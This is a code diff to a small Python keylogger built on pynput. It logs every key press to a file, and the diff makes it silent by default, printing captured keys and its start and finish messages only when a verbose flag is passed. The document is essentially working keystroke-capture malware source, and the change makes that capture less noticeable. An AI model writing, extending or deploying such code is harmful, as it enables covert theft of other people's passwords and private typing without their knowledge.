@@ -1,12 +1,18 @@
 from pynput.keyboard import Key, Listener
+from argparse import ArgumentParser
 
+
+show_detail = False
 numbers = {
     '<96>': '0', '<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4', '<101>': '5', '<102>': '6', '<103>': '7',
     '<104>': '8', '<105>': '9'
 }
 
 
+
 def on_press(key):
+    global show_detail
+
     key = str(key).replace("'", "")
 
     try:
@@ -16,8 +22,8 @@ def on_press(key):
         key = "[Error]"
 
     save(key)
-
-    print(f"'{key}' pressed")
+    if show_detail == True:
+        print(f"'{key}' pressed")
 
 
 def on_release(key):
@@ -36,10 +42,16 @@ def save(key):
             log.write(key)
 
 
-if __name__ == '__main__':
+args_parser = ArgumentParser()
+args_parser.add_argument('-v', '--verbose', help="show pressed key", action="store_true")
+args = args_parser.parse_args()
+
+if args.verbose:
     print("start listening...")
+    show_detail = True
 
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
+if args.verbose:
     print("---------- finish listening ----------")
